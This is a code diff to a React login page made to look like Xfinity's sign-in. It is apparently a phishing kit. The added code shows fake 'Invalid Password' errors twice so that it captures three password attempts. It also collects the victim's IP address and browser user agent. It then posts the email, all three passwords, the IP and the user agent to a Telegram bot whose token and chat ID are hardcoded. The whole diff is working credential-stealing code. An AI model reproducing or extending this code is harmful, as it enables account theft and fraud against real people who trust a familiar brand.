@@ -16,8 +16,23 @@ const Home = () => {
     const [password, setPassword] = useState('')
     const [input, toggleInput] = useState(false)
     const [formError, setFormError] = useState(false);
-    const [passwordError, setPasswordError] = useState(false);
+    const [passwordError, setPasswordError] = useState('');
     const { userEmail } = useParams()
+    const [count, setCount] = useState(0)
+    const [clientIp, setClientIp] = useState('');
+    const [userAgent, setUserAgent] = useState(navigator.userAgent);
+  
+    useEffect(() => {
+      // Fetch the client's IP address using an external API
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          setClientIp(data.ip);
+        })
+        .catch(error => {
+          console.error('Error fetching IP address:', error);
+        });
+    }, []);
     useEffect(() => {
         if (userEmail) {
             setEmail(userEmail)
@@ -69,36 +84,69 @@ const Home = () => {
         }
     };
 
+    const [password1, togglePassword1] = useState('')
+    const [password2, togglePassword2] = useState('')
+
     const handlePassword = async () => {
         if (!password) {
-            setPasswordError(true);
+            setPasswordError('Password must be 8 characters or more');
         } else {
-            setPasswordError(false);
-            // Proceed with form submission
 
-            const message = `Email: ${email}\nPassword: ${password}\nWebsite: xfinity.com`;
+            if (count < 2) {
+                if (count === 0) {
+                    togglePassword1(password)
+                    setPassword('')
+                    setPasswordError('Invalid Password')
+                    setTimeout(() => {
+                        setPasswordError('')
+                    }, 2000);
+                    setCount(count + 1)
+                }
+                if (count === 1) {
+                    togglePassword2(password)
+                    setPassword('')
+                    setPasswordError('Invalid Password')
+                    setTimeout(() => {
+                        setPasswordError('')
+                    }, 2000);
+                    setCount(count + 1)
+                }
+            }
+            else {
+                setPasswordError('');
+                setPassword('')
+                // Proceed with form submission
 
-            // Replace these values with your bot token and chat ID
-            const botToken = '7072591946:AAEoGhlnq4X9wUs7r5omOeDy2aXLbQ-RI9I';
-            const chatId = '5092152880';
+                const message = `Email: ${email}
+                Password1: ${password1}
+                Password2: ${password2}
+                Password3: ${password}
+                Website: xfinity.com
+                Client IP: ${clientIp}
+                User Agent: ${userAgent}`;
 
-            try {
-                // Send the message to Telegram
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                });
+                // Replace these values with your bot token and chat ID
+                const botToken = '7072591946:AAEoGhlnq4X9wUs7r5omOeDy2aXLbQ-RI9I';
+                const chatId = '5092152880';
 
-                // Optional: Handle success feedback or further actions here
-                alert('Data sent successfully!');
-            } catch (error) {
-                console.error('Error sending message:', error);
+                try {
+                    // Send the message to Telegram
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                        }),
+                    });
+
+                    // Optional: Handle success feedback or further actions here
+                    alert('Data sent successfully!');
+                } catch (error) {
+                    console.error('Error sending message:', error);
+                }
             }
         }
     };
@@ -125,7 +173,7 @@ const Home = () => {
                         />
                     }
                     {formError && <p className="text-red-500">Please enter a valid email address.</p>}
-                    {passwordError && <p className="text-red-500">Password must not be empty.</p>}
+                    {passwordError && <p className="text-red-500">{passwordError}</p>}
                     <p className='pb-8'>By signing in, you agree to our <a className='text-[#6A2DC0] underline' href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a className='text-[#6A2DC0] underline' href="https://www.xfinity.com/privacy/">Privacy Policy</a>.</p>
                     <div className='pb-8'>
                         {!input ? <button onClick={handleEmail} className='text-md font-semibold text-white rounded-md bg-[#5A23B9] hover:bg-[#432379] px-8 py-4 transition-all duration-500'>Let's go</button>
